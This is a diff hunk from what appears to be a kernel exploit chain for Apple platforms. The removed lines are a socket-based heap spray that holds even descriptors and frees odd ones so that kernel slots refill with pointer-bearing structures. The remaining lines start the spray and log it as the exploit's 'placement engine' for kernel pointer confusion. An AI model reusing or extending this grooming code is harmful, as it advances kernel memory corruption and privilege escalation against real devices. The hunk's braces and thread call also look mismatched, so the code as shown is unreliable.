@@ -136,45 +136,9 @@ static void *p177_spray_thread(void *arg) {
     {
         atomic_store(&s_p177_sprayGoStorage, 1);
         pthread_create(&s_p177_sprayTid, NULL, p177_spray_thread, NULL);
-            /* the cskrw-scale interleaved groom: hold every EVEN fd, close
-               every ODD fd — the freed slots refill with SYSTEM churn =
-               other processes' pointer-bearing structures */
-            int hold[4096];
-            int holdN = 0;
-            uint64_t totalHeld = 0;
-            while (atomic_load(&p177_sprayGo)) {
-                int fds[512];
-                int count = 0;
-                for (int i = 0; i < 512; i++) {
-                    fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
-                    if (fds[i] >= 0) count++;
-                }
-                for (int i = 0; i < 512; i++) {
-                    if (fds[i] < 0) continue;
-                    if (i & 1) {
-                        close(fds[i]);
-                        atomic_fetch_add(&p177_sprayFrees, 1);
-                    } else {
-                        if (holdN < 4096) hold[holdN++] = fds[i];
-                        else close(fds[i]);
-                        totalHeld++;
-                    }
-                }
-                atomic_fetch_add(&p177_sprayAllocs, count);
-                /* cap: recycle the holds at 2048 to keep the fd table sane */
-                if (totalHeld > 2048) {
-                    for (int i = 0; i < holdN; i++) close(hold[i]);
-                    holdN = 0; totalHeld = 0;
-                }
-                usleep(1000);   /* 1ms pacing */
-            }
-            for (int i = 0; i < holdN; i++) close(hold[i]);
-            return NULL;
-        }, NULL);
         Lf(@"[*] STEP 0: concurrent cskrw-scale spray LIVE (the kernel-content");
         Lf(@"    placement engine — the receipt: kptr confusion ONLY with cskrw");
         Lf(@"    concurrent; the calib's 512-burst is 44x too small)");
-        /* the spray stays live until the chain's END (stopped below) */
         s_p177_sprayLive = 1;
     }
 
